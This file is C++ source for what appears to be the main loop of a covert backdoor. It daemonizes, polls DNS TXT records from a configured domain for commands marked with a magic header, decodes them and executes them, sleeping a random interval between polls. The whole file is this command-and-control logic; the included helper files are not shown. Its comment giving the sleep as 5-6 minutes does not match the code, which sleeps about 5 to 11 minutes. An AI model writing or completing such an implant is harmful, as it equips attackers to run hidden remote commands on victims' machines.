#include <vector>
#include <iostream>
#include <string>
#include <thread>
#include <chrono>

using namespace std;

#include "config.hpp"
#include "startup.cpp"
#include "dns_query.cpp"
#include "process_commands.cpp"

int main(int argc, char **argv) {
	startup start;
	start.daemonize();
	srand(time(NULL)); // need to seed the rng
	dns_query query(domain, magic_header, dns_resolvers);
	while(true) {
		string record = query.get_txt_results();
		if(!record.empty()) {
			process_commands cmd(magic_header, record);
			cmd.strip_header();
			cmd.decode_cmd();
			cmd.get_correct_cmd();
			cmd.execute_cmd();
		}
		this_thread::sleep_for(chrono::seconds(rand() % 360 + 300)); // randomly sleep for between 5-6 minutes
	}
    return EXIT_SUCCESS;
}